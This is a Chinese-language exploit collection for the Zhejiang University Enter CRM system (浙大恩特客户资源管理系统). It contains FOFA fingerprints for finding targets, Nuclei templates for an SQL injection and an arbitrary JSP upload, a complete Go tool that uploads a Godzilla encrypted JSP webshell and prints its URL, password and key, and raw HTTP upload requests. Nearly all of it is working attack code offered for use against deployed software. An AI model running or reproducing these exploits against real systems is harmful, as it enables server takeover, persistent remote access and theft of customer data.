## 浙大恩特客户资源管理系统 文件上传和sql注入漏洞

## 特征
```
app.name="浙大恩特 CRM"
app="浙大恩特客户资源管理系统"
```

## SQL注入
```yaml
id: enter-T0140_editAction-api-sqli

info:
  name: 浙大恩特客户资源管理系统T0140_editAction.entweb;.js接口sql注入漏洞
  author: YGnight
  severity: high
  description: description
  reference:
    - https://
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="浙大恩特客户资源管理系统"


requests:
  - raw:
      - |+
        GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Cookie: JSESSIONID=1DAEEF5E703FF40871BD44A67C1EEDD5; JSESSIONID=2C6DAAA80F315B114CD65C9DA80D8D8C
        Upgrade-Insecure-Requests: 1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '0'

```

## 文件上传1
```yaml
id: enter-machord_doc-api-fileupload

info:
  name: 浙大恩特客户资源管理系统machord_doc.jsp;.js接口任意文件上传
  author: YGnight
  severity: high
  description: description
  reference:
    - https://
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="浙大恩特客户资源管理系统"


requests:
  - raw:
      - |-
        POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=night.jsp&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: multipart/form-data; boundary=----4225820000370152680749129212
        Content-Length: 548

        ------4225820000370152680749129212
        Content-Disposition: form-data; name="oprfilenam"

        null
        ------4225820000370152680749129212
        Content-Disposition: form-data; name="uploadflg"

        0
        ------4225820000370152680749129212
        Content-Disposition: form-data; name="strAffixStr"


        ------4225820000370152680749129212
        Content-Disposition: form-data; name="selfilenam"


        ------4225820000370152680749129212
        Content-Disposition: form-data; name="uploadfile"; filename="night.jsp"
        Content-Type: image/png

        night
        ------4225820000370152680749129212--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'night.jsp'
```

## 文件上传2
```go
package main

import (
        "bytes"
        "crypto/md5"
        "crypto/tls"
        "encoding/json"
        "fmt"
        "github.com/hpifu/go-kit/hflag"
        "github.com/liushuochen/gotable"
        "github.com/thanhpk/randstr"
        "io/ioutil"
        "mime/multipart"
        "net/http"
        "os"
        "strings"
        "time"
)

type Resutl struct {
        VisitRoot string `json:"visitRoot"`
        FileName  string `json:"fileName"`
        Path      string `json:"path"`
        IsImage   bool   `json:"isImage"`
        Msg       string `json:"msg"`
}

func main() {
        context, password, key := initGodZillaShell()
        str := gethost()
        s := exploit(str, context)
        shellURL := strings.Replace(str+s, "//ent", "/ent", 1)
        tb, _ := gotable.Create("ShellURL", "ShellPass", "ShellKey")
        _ = tb.AddRow([]string{
                shellURL, password, key,
        })
        fmt.Println(tb)
}

func initGodZillaShell() (shellContext, shellPassword, shellKey string) {
        password := randstr.Hex(12)
        safeKey := randstr.Hex(6)
        md5Key := fmt.Sprintf("%x", md5.Sum([]byte(safeKey)))[0:16]
        shellContent := "<%! String xc=\"" + md5Key + "\"; String pass=\"" + password + "\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Encoder\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\"payload\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}\n%>"
        return shellContent, password, safeKey
}

func gethost() string {
        hflag.AddFlag("target", "浙大恩特地址", hflag.Required(), hflag.Shorthand("t"))
        if err := hflag.Parse(); err != nil {
                fmt.Println(hflag.Usage())
                os.Exit(0)
        }
        return hflag.GetString("target")
}
func cli() *http.Client {
        c := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
        c.Timeout = time.Second * 15
        return c
}

func exploit(t, s string) string {
        client := cli()
        buffer := &bytes.Buffer{}
        writer := multipart.NewWriter(buffer)
        filename := randstr.Hex(8) + ".jsp"
        _, _ = writer.CreateFormFile("file", filename)
        _, _ = buffer.WriteString(s)
        _ = writer.Close()
        target := strings.Replace(t+"/entsoft/MailAction.entphone;.js?act=saveAttaFile", "//en", "/en", 1)
        request, _ := http.NewRequest(http.MethodPost, target, strings.NewReader(buffer.String()))
        request.Header.Set("Content-Type", writer.FormDataContentType())
        request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
        do, _ := client.Do(request)
        defer func() {
                _ = do.Body.Close()
        }()
        all, _ := ioutil.ReadAll(do.Body)
        var result Resutl
        _ = json.Unmarshal(all, &result)
        if result.Msg != "上传成功" {
                fmt.Println("上传失败了")
                os.Exit(0)
        }
        split := strings.Split(result.VisitRoot, "null")
        return split[1]
}

```
## 文件上传3
```

POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=plugins.jsp HTTP/1.1
Host: xxxxxxxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

1111
```

## 文件上传4
```

POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 203

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="as.jsp"
Content-Type: image/jpeg

<%out.print("test");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```
